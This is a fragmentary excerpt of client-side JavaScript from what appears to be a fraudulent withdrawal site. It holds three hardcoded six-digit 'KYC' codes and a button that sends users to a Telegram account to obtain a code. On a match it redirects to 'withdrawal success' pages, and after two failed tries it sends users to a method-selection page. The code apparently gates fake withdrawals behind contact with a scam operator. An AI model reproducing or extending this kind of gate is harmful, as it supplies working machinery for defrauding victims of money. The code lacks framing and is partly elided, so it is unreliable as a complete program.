...
const kyc1 = ['3','9','6','6','5','9'];
const kyc2 = ['9','1','4','9','9','2'];
const kyc3 = ['1','6','3','9','2','1'];
...
get_kyc_btn.addEventListener('click', () => {
    location.assign("https://t.me/Jessica55091");
...
function validate_secret_code(kyc1, u_input){
    ...
    if(kyc1[0]===u_input[0] && kyc1[1]===u_input[1] && kyc1[2]===u_input[2]
        && kyc1[3]===u_input[3] && kyc1[4]===u_input[4] && kyc1[5]===u_input[5]){
            ...
            location.href="/kyc9/views/kyc2/withdrawal_success.html";
        ...
        && kyc3[3]===u_input[3] && kyc3[4]===u_input[4] && kyc3[5]===u_input[5]){
            ...
            // redirect to login page
            location.href="/kyc9/views/kyc2/withdrawal_succcess.html";
        ...
        if(tryal_counter === 2){
            location.assign("/kyc9/views/kyc2/method_select.html");
        }
    }
}
